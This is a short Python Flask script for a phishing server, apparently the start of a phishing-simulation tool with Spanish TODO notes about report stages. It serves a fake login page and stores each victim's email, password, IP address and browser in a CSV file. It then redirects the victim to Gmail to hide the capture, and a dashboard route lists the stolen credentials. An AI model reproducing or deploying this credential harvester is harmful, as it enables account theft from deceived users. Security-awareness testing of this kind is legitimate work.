import sys
import json
import csv
from datetime import datetime
from flask import Flask, request, render_template, redirect

app = Flask(__name__)

FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date']

@app.route('/', methods=['GET', 'POST'])
def phishing_server():
    target = sys.argv[1]
    if request.method == 'POST':
        with open('names.csv', 'w+', newline='') as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
            writer.writeheader()
            writer.writerow({
                'ip_addr': request.remote_addr,
                'email': request.form['email'],
                'password': request.form['password'],
                'user_agent': f'{request.user_agent.browser} - {request.user_agent.version}',
                'platform': request.user_agent.platform,
                'date': datetime.now().strftime('%H:%m %d-%m-%Y')
            })
        return redirect("https://www.gmail.com", code=302)
        # TODO: todos estos cmapos se vana  meter en un CSV.
        # este CSV va a contener ip, email, passw, navegador....
        # además una fase o stage, por ejemplo si se ha llegado hasta aqí es que el se ha saltado
        # varias protecciones... pues eso también hay que pònerlo para cuando se genere el informe.
        # redirect a donde toque
    return render_template(target, name='index')


@app.route('/dashboard', methods=['GET'])
def dashboard():
    input_file = csv.DictReader(open('names.csv', 'r'))
    out = [ row for row in input_file ] 

    return render_template(
        'dashboard.html', 
        response=out, 
        name='dashboard'
    )



if __name__ == '__main__':
    app.run(host='0.0.0.0', port='80')
